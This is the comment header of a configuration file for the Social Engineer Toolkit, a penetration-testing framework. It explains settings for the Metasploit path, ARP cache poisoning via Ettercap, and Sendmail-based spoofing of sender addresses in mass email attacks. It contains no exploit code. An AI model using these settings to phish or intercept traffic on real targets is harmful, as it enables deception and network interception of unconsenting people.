## The following config file will allow you to customize settings within			##
## the Social Engineer Toolkit. The lines that do not have comment code				##
## ("#") are the fields you want to toy with. They are pretty easy to				##
## understand.											##
##												##
## The Metasploit path is the default path for where Metasploit is located.			##
## Metasploit is required for SET to function properly.						##
##												##
## The ETTERCAP function specifies if you want to use ARP Cache poisoning in			##
## conjunction with the web attacks, note that ARP Cache poisoning is only			##
## for internal subnets only and does not work against people on the internet.			##
##												##
## The SENDMAIL option allows you to spoof source IP addresses utilizing an			##
## application called SendMail. Sendmail is NOT installed by default on BackTrack5.		##
## To spoof email addresses when performing the mass email attacks, you must 			## 
## install Sendmail manually using: apt-get install sendmail					##
##												##
## Note that ETTERCAP and SENDMAIL flags only accept ON or OFF switches.			##
##												##
## Note that the Metasploit_PATH cannot have a / after the folder name.				##
##												##
## There are additional options, read the comments for additional descriptions.		        ##
